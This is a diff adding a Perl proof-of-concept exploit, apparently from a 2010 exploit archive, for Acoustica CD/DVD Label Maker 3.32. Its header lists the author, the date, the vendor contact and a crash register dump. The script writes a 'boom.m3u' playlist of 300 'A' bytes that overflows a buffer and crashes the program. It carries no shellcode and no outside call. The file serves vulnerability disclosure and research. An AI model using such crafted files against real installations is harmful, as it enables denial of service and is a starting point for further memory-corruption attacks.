@@ -1,0 +1,36 @@
+# Exploit Title: Acoustica cd/dvd label maker .m3u PoC
+# Date: April 27,2010
+# Software Link: [http://www.acoustica.com/cd-label-maker/]
+# Version: 3.32
+# Tested on: Windows XP Sp3/Windows 7
+# Author: chap0	
+# Email: chap0x90 at gmail dot com
+# 
+# Contacted Vendor Apr 19, 2010
+# Auto Reply Support Ticket ID:155626 Apr 19 2010
+# No further communication from vendor
+# 
+# Greetz and Thanks to mr_me 
+#
+#
+# EAX 00000041
+# ECX 0000012C
+# EDX 000DE9A8 UNICODE "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. . ."
+# EBX 000004EA
+# ESP 000DE960
+# EBP 000DEBB8 UNICODE "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+# ESI 00410041 cdlabel.00410041
+# EDI 00410041 cdlabel.00410041
+# EIP 00605216 cdlabel.00605216
+#
+#!/usr/bin/perl
+
+$file = "boom.m3u";
+$junk = "\x41" x 300;
+
+print "Creating Nasty .m3u file\n";
+open (FILE, ">$file");
+print FILE "$junk";
+close FILE;
+
+print "Done\n";
